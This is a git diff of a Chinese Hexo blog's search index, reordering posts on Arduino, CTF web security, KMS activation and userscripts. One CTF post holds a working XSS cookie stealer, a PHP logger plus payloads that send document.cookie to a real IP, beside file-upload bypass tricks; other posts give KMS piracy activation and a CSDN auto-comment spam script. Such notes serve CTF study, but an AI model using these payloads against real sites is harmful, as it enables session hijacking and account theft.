@@ -136,19 +136,6 @@
       </categories>
   </entry>
   <entry>
-    <title>RFID</title>
-    <url>/Arduino-RFID/</url>
-    <content><![CDATA[<h1 id="RFID"><a href="#RFID" class="headerlink" title="RFID"></a>RFID</h1><p>本文采用RFID-RC522</p>
-<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>VCC 模块供电3.3V<br>GND 接地</p>
-<h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>SDA–10<br>SCK–13<br>MOSI–11<br>MISO–12<br>RST–9</p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;SPI.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;MFRC522.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MFRC522 <span class="title function_">rfid</span><span class="params">(<span class="number">10</span>, <span class="number">9</span>)</span>;</span><br><span class="line">String item;</span><br><span class="line"></span><br><span class="line">String <span class="title function_">MFRC522_ReadCardUID</span><span class="params">(MFRC522 *_name)</span>&#123;</span><br><span class="line">  String _CardUID = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (byte _i = <span class="number">0</span>; _i &lt; _name-&gt;uid.size; _i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(_name-&gt;uid.uidByte[_i] &lt; <span class="number">0x10</span>)</span><br><span class="line">      _CardUID += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    _CardUID += String(_name-&gt;uid.uidByte[_i], HEX);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _CardUID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boolean <span class="title function_">MFRC522_IsNewCard</span><span class="params">(MFRC522 *_name)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!_name-&gt;PICC_IsNewCardPresent())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(!_name-&gt;PICC_ReadCardSerial())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span>&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">  SPI.begin();</span><br><span class="line">  rfid.PCD_Init();</span><br><span class="line">  item = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(MFRC522_IsNewCard(&amp;rfid))&#123;</span><br><span class="line">    item = MFRC522_ReadCardUID(&amp;rfid);</span><br><span class="line">    Serial.println(item);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    rfid.PICC_HaltA();</span><br><span class="line">    rfid.PCD_StopCrypto1();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>刷卡后在串口显示器显示对应字符串</p>
-]]></content>
-      <categories>
-        <category>Arduino</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ULN2003电机驱动模块</title>
     <url>/Arduino-ULN2003%E7%94%B5%E6%9C%BA%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97/</url>
     <content><![CDATA[<h1 id="ULN2003电机驱动模块"><a href="#ULN2003电机驱动模块" class="headerlink" title="ULN2003电机驱动模块"></a>ULN2003电机驱动模块</h1><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><strong>28BYJ-48步进电机</strong> 外径28毫米四相八拍式永磁减速型步进电机<br>VCC 模块供电5V<br>GND 接地</p>
@@ -158,6 +145,19 @@
 
 <h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>驱动电机顺时针旋转一周后逆时针旋转半周，如此循环往复</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] </p>
+]]></content>
+      <categories>
+        <category>Arduino</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>RFID</title>
+    <url>/Arduino-RFID/</url>
+    <content><![CDATA[<h1 id="RFID"><a href="#RFID" class="headerlink" title="RFID"></a>RFID</h1><p>本文采用RFID-RC522</p>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>VCC 模块供电3.3V<br>GND 接地</p>
+<h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>SDA–10<br>SCK–13<br>MOSI–11<br>MISO–12<br>RST–9</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;SPI.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;MFRC522.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MFRC522 <span class="title function_">rfid</span><span class="params">(<span class="number">10</span>, <span class="number">9</span>)</span>;</span><br><span class="line">String item;</span><br><span class="line"></span><br><span class="line">String <span class="title function_">MFRC522_ReadCardUID</span><span class="params">(MFRC522 *_name)</span>&#123;</span><br><span class="line">  String _CardUID = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (byte _i = <span class="number">0</span>; _i &lt; _name-&gt;uid.size; _i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(_name-&gt;uid.uidByte[_i] &lt; <span class="number">0x10</span>)</span><br><span class="line">      _CardUID += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    _CardUID += String(_name-&gt;uid.uidByte[_i], HEX);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _CardUID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boolean <span class="title function_">MFRC522_IsNewCard</span><span class="params">(MFRC522 *_name)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!_name-&gt;PICC_IsNewCardPresent())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(!_name-&gt;PICC_ReadCardSerial())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span>&#123;</span><br><span class="line">  Serial.begin(<span class="number">9600</span>);</span><br><span class="line">  SPI.begin();</span><br><span class="line">  rfid.PCD_Init();</span><br><span class="line">  item = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(MFRC522_IsNewCard(&amp;rfid))&#123;</span><br><span class="line">    item = MFRC522_ReadCardUID(&amp;rfid);</span><br><span class="line">    Serial.println(item);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    rfid.PICC_HaltA();</span><br><span class="line">    rfid.PCD_StopCrypto1();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>刷卡后在串口显示器显示对应字符串</p>
 ]]></content>
       <categories>
         <category>Arduino</category>
@@ -186,18 +186,6 @@
 ]]></content>
       <categories>
         <category>Arduino</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Crypto解码导航</title>
-    <url>/CTF-Crypto%E8%A7%A3%E7%A0%81%E5%AF%BC%E8%88%AA/</url>
-    <content><![CDATA[<p><a href="https://cmd5.com/">md5在线解密破解 - cmd5</a></p>
-<p><a href="https://www.toolhelper.cn/">锤子在线工具网</a></p>
-<p><a href="https://hashes.com/zh/decrypt/hash">MD5 在線免費解密 MD5、SHA1、MySQL、NTLM、SHA256、SHA512、Wordpress、Bcrypt 的雜湊</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Crypto</category>
       </categories>
   </entry>
   <entry>
@@ -253,31 +241,9 @@
 <p>windows服务端中，PHP会把 ::$DATA 之后的数据当成数据流处理，创建文件时保持 ::$DATA 之前的文件名，因此可以通过在后缀名中加 ::$DATA 的方法绕过黑名单。</p>
 <p>针对目标网站在服务端使用 str_ireplace() 函数对文件名中黑名单关键词替换为空的，可以使用双写绕过的方法绕过黑名单。<br><code>.pphphp</code></p>
 <p>当服务端 php 版本小于5.3.4，并且配置文件中的配置项 magic_quotes_gpc 值为 0FF 时，可以使用00截断的方法绕过。</p>
-<p>针对目标网站在服务端使用 fread() 、getimagesize() 、exif_imagetype() 等函数对文件的前几个字节进行校验的，都可以通过图片马成功上传文件，但是要集合文件包含漏洞进行攻击。</p>
+<p>针对目标网站在服务端使用 fread() 、getimagesize() 、exif_imagetype() 等函数对文件的前几个字节进行校验的，都可以通过图片马成功上传文件，但是要结合文件包含漏洞进行攻击。</p>
 <p>对于目标网站将上传文件进行二次渲染的，可以选择gif类型的图片马上传，减少二次渲染过程中对图片内容的压缩损失，也避免了图片马中php代码的丢失。</p>
 <p>对于目标网站服务端是先把文件上传到目标目录下，然后判断文件类型，如果不是图片类型的文件，则再删除该文件的流程，可以使用条件竞争的方法进行攻击。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>简易XSS数据接收平台实现</title>
-    <url>/CTF-%E7%AE%80%E6%98%93XSS%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E5%B9%B3%E5%8F%B0%E5%AE%9E%E7%8E%B0/</url>
-    <content><![CDATA[<p>尝试了现有的框架XSS Platform和xss BlueLotus，功能丰富，但是总是难以接收到数据。故出此下策，用自己的云服务器搭建简易的XSS数据接收平台。</p>
-<p>PoC<br><code>&lt;script&gt;alert(&quot;xsshack!&quot;);&lt;/script&gt;</code></p>
-<p>hack.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 文件路径  </span></span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&#x27;cookie.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET传参</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 &#x27;a&#x27; 模式打开文件（追加模式）  </span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filePath</span>, <span class="string">&#x27;a&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否成功打开  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>) &#123;  </span><br><span class="line">    <span class="comment">// 获取当前时间  </span></span><br><span class="line">    <span class="variable">$currentTime</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要写入的内容，这里我们添加了时间戳  </span></span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Time:&quot;</span>.<span class="variable">$currentTime</span>.<span class="string">&quot;\n&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入内容到文件  </span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件  </span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;内容已成功写入文件。&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="comment">// 如果文件打开失败  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;无法打开文件。&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>上面这个php便可以接收cookie值并存入文件中，搭配下面Exp使用即可。<br><code>&lt;script&gt;window.open(&#39;http://43.139.207.11/xsshack/hack.php?cookie=&#39;+document.cookie)&lt;/script&gt;</code></p>
-<p>如果遇见一些WAF对php或者cookie等关键词做屏蔽的话，可以搭配下面的js文件进行使用。</p>
-<p>hack.js</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://43.139.207.11/xsshack/hack.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(img);</span><br></pre></td></tr></table></figure>
-
-<p>此时的Exp如下。<br><code>&lt;script src= &quot;http://43.139.207.11/xsshack/hack.js&quot;&gt;&lt;/script&gt;</code></p>
-<p>有时候需要对前面的文本域做一些闭合。<br><code>&lt;/textarea&gt;</code></p>
-<p>对众多WAF的绕过姿势类似于sql注入，比如双写、大小写混合、空格等等。<br><code>/**/</code></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -305,6 +271,28 @@
 <p><a href="http://rgjy8.nczxst.com/gdjg">广东警官学院-入馆教育系统</a></p>
 <p><a href="https://www.duxiu.com/login.jsp">读秀学术搜索</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>简易XSS数据接收平台实现</title>
+    <url>/CTF-%E7%AE%80%E6%98%93XSS%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E5%B9%B3%E5%8F%B0%E5%AE%9E%E7%8E%B0/</url>
+    <content><![CDATA[<p>尝试了现有的框架XSS Platform和xss BlueLotus，功能丰富，但是总是难以接收到数据。故出此下策，用自己的云服务器搭建简易的XSS数据接收平台。</p>
+<p>PoC<br><code>&lt;script&gt;alert(&quot;xsshack!&quot;);&lt;/script&gt;</code></p>
+<p>hack.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 文件路径  </span></span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&#x27;cookie.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET传参</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 &#x27;a&#x27; 模式打开文件（追加模式）  </span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filePath</span>, <span class="string">&#x27;a&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否成功打开  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>) &#123;  </span><br><span class="line">    <span class="comment">// 获取当前时间  </span></span><br><span class="line">    <span class="variable">$currentTime</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要写入的内容，这里我们添加了时间戳  </span></span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Time:&quot;</span>.<span class="variable">$currentTime</span>.<span class="string">&quot;\n&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入内容到文件  </span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件  </span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;内容已成功写入文件。&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="comment">// 如果文件打开失败  </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;无法打开文件。&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面这个php便可以接收cookie值并存入文件中，搭配下面Exp使用即可。<br><code>&lt;script&gt;window.open(&#39;http://43.139.207.11/xsshack/hack.php?cookie=&#39;+document.cookie)&lt;/script&gt;</code></p>
+<p>如果遇见一些WAF对php或者cookie等关键词做屏蔽的话，可以搭配下面的js文件进行使用。</p>
+<p>hack.js</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://43.139.207.11/xsshack/hack.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(img);</span><br></pre></td></tr></table></figure>
+
+<p>此时的Exp如下。<br><code>&lt;script src= &quot;http://43.139.207.11/xsshack/hack.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>有时候需要对前面的文本域做一些闭合。<br><code>&lt;/textarea&gt;</code></p>
+<p>对众多WAF的绕过姿势类似于sql注入，比如双写、大小写混合、空格等等。<br><code>/**/</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
   </entry>
   <entry>
     <title>Hexo+GitHub Pages一条龙</title>
@@ -392,6 +380,21 @@
 <p><strong>Office 2019</strong><br>ospp &#x2F;insLicID ProPlus2019Volume &#x2F;sethst:kms.loli.beer &#x2F;setprt:1688 &#x2F;act</p>
 <h3 id="激活工具"><a href="#激活工具" class="headerlink" title="激活工具"></a>激活工具</h3><h4 id="HEU-KMS-Activator"><a href="#HEU-KMS-Activator" class="headerlink" title="HEU_KMS_Activator"></a>HEU_KMS_Activator</h4><p>也可以通过<a href="https://github.com/zbezj/HEU_KMS_Activator">HEU_KMS_Activator</a>进行激活,作者为”知彼而知己”.<br>其他渠道下载<a href="https://www.landiannews.com/archives/57559.html">HEU KMS Activator更新到v19.0.0版-蓝点网</a><br>需要关闭杀毒软件，不然会误报<br>Windows 7激活略有瑕疵</p>
 <h4 id="DragonKMS"><a href="#DragonKMS" class="headerlink" title="DragonKMS"></a>DragonKMS</h4><p><a href="http://www.yishimei.cn/network/319.html">DragonKMS神龙版 - 亦是美网络</a></p>
+]]></content>
+      <categories>
+        <category>Other</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Steam</title>
+    <url>/Other-Steam/</url>
+    <content><![CDATA[<p><a href="https://store.steampowered.com/">Steam</a> 是Valve公司推出的电子游戏数字发行平台，是全球最大的综合性数字发行平台之一。玩家可以在该平台购买、下载、讨论、上传和分享游戏和软件。</p>
+<p><a href="https://steamdb.info/">SteamDB</a> 是一个第三方Steam数据库网站，提供了大量Steam相关的有用信息。你可以在该网站上查询Steam游戏的区域信息、打折信息、价格变动信息以及激活码相关信息。此外，SteamDB还能帮助你预知游戏促销和大型活动，对于Steam的使用非常有帮助。</p>
+<p>玩家可以通过购买并使用CDKey来获得游戏，下面是一些CDKey的交易网站。</p>
+<ul>
+<li><a href="https://steampy.com/home">SteamPY</a></li>
+<li><a href="https://www.sonkwo.cn/">杉果游戏</a></li>
+</ul>
 ]]></content>
       <categories>
         <category>Other</category>
@@ -628,6 +631,16 @@
       </categories>
   </entry>
   <entry>
+    <title>软件分享</title>
+    <url>/Other-%E8%BD%AF%E4%BB%B6%E5%88%86%E4%BA%AB/</url>
+    <content><![CDATA[<h2 id="VMware-Workstation-Pro"><a href="#VMware-Workstation-Pro" class="headerlink" title="VMware Workstation Pro"></a>VMware Workstation Pro</h2><p><a href="https://www.bilibili.com/read/cv34653812/">VMware Workstation Pro 17.5.2：个人用户免费，附最新版本下载 - 哔哩哔哩 (bilibili.com)</a></p>
+<p><a href="https://blog.csdn.net/u013669912/article/details/130608711">VMware Workstation Pro 最新版本下载（Windows 、linux）_vmware-workstation pro win版的全版本官方链接-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>Other</category>
+      </categories>
+  </entry>
+  <entry>
     <title>爬虫</title>
     <url>/Python-%E7%88%AC%E8%99%AB/</url>
     <content><![CDATA[<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>  网络爬虫又称网络蜘蛛、网络机器人，它是一种按照一定的规则自动浏览、检索网页信息的程序或者脚本。网络爬虫能够自动请求网页，并将所需要的数据抓取下来。通过对抓取的数据进行处理，从而提取出有价值的信息。</p>
@@ -681,30 +694,20 @@
       </categories>
   </entry>
   <entry>
+    <title>实现复制</title>
+    <url>/UserScript-%E5%AE%9E%E7%8E%B0%E5%A4%8D%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="实现复制"><a href="#实现复制" class="headerlink" title="实现复制"></a>实现复制</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;你好，我能被复制&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>点击复制<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 1. 获取input，并选择它</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;input&quot;</span>).<span class="title function_">select</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 2. 执行copy命令</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&quot;copy&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>UserScript</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CSDN一键点赞评论</title>
     <url>/UserScript-CSDN%E4%B8%80%E9%94%AE%E7%82%B9%E8%B5%9E%E8%AF%84%E8%AE%BA/</url>
     <content><![CDATA[<h1 id="CSDN一键点赞评论"><a href="#CSDN一键点赞评论" class="headerlink" title="CSDN一键点赞评论"></a>CSDN一键点赞评论</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name          CSDN 手动一键点赞评论</span></span><br><span class="line"><span class="comment">// @version       0.0.1</span></span><br><span class="line"><span class="comment">// @description  打开博文，点击一键点赞评论按钮后自动为该博文点赞以及评论，前提是已经登录 csdn 博客</span></span><br><span class="line"><span class="comment">// @include      *://blog.csdn.net/*/article/details/*</span></span><br><span class="line"><span class="comment">// @include      *.blog.csdn.net/article/details/*</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;button&quot;</span>); <span class="comment">//创建一个按钮</span></span><br><span class="line">    button.<span class="property">textContent</span> = <span class="string">&quot;一键点赞评论&quot;</span>; <span class="comment">//按钮内容</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;90px&quot;</span>; <span class="comment">//按钮宽度</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">height</span> = <span class="string">&quot;28px&quot;</span>; <span class="comment">//按钮高度</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">align</span> = <span class="string">&quot;center&quot;</span>; <span class="comment">//文本居中</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;white&quot;</span>; <span class="comment">//按钮文字颜色</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&quot;#e33e33&quot;</span>; <span class="comment">//按钮底色</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&quot;1px solid #e33e33&quot;</span>; <span class="comment">//边框属性</span></span><br><span class="line">    button.<span class="property">style</span>.<span class="property">borderRadius</span> = <span class="string">&quot;4px&quot;</span>; <span class="comment">//按钮四个角弧度    </span></span><br><span class="line">    button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, clickBotton) <span class="comment">//监听按钮点击事件</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">clickBotton</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> comment=[<span class="string">&quot;针不戳呀，写的针不戳！&quot;</span>,<span class="string">&quot;学习了！b（￣▽￣）d&quot;</span>,<span class="string">&quot;本文不错(￣ˇ￣)，值得学习！(=￣ω￣=)&quot;</span>,<span class="string">&quot;感谢博主的分享！(^ ^)／▽▽＼(^ ^)&quot;</span>,<span class="string">&quot;感谢博主，你的文章让我得到一些收获！(￣ˇ￣)&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> <span class="variable constant_">STARTNUMBER</span> = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable constant_">ENDNUMBER</span> = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">var</span> temp_count = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*(<span class="variable constant_">STARTNUMBER</span>-<span class="variable constant_">ENDNUMBER</span>+<span class="number">1</span>))+<span class="variable constant_">ENDNUMBER</span> ;<span class="comment">//取STARTNUMBER-ENDNUMBER之间的随机数 [STARTNUMBER,ENDNUMBER]</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;tool-item-comment&quot;</span>)[<span class="number">0</span>].<span class="title function_">click</span>(); <span class="comment">//打开评论区</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comment_content&quot;</span>).<span class="property">value</span> = comment[temp_count]; <span class="comment">//随机把一条预先写好的评论赋值到评论框里面</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;btn-comment&quot;</span>)[<span class="number">0</span>].<span class="title function_">click</span>(); <span class="comment">//发表评论</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;is-like&quot;</span>).<span class="title function_">click</span>() <span class="comment">//点赞。把该代码注释后只会一键评论</span></span><br><span class="line"></span><br><span class="line">&#125;,<span class="number">100</span>);<span class="comment">// setTimeout 0.1秒后执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> like_comment = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;toolbox-list&#x27;</span>)[<span class="number">0</span>]; <span class="comment">//getElementsByClassName 返回的是数组，所以要用[] 下标</span></span><br><span class="line">    like_comment.<span class="title function_">appendChild</span>(button); <span class="comment">//把按钮加入到 x 的子节点中</span></span><br><span class="line">    </span><br><span class="line">&#125;)(); <span class="comment">//(function()&#123;&#125;)() 表示该函数立即执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/mukes/article/details/109727662?spm=1001.2014.3001.5501">如何开发一个油猴脚本 - CSDN</a></p>
 ]]></content>
-      <categories>
-        <category>UserScript</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>软件分享</title>
-    <url>/Other-%E8%BD%AF%E4%BB%B6%E5%88%86%E4%BA%AB/</url>
-    <content><![CDATA[<h2 id="VMware-Workstation-Pro"><a href="#VMware-Workstation-Pro" class="headerlink" title="VMware Workstation Pro"></a>VMware Workstation Pro</h2><p><a href="https://www.bilibili.com/read/cv34653812/">VMware Workstation Pro 17.5.2：个人用户免费，附最新版本下载 - 哔哩哔哩 (bilibili.com)</a></p>
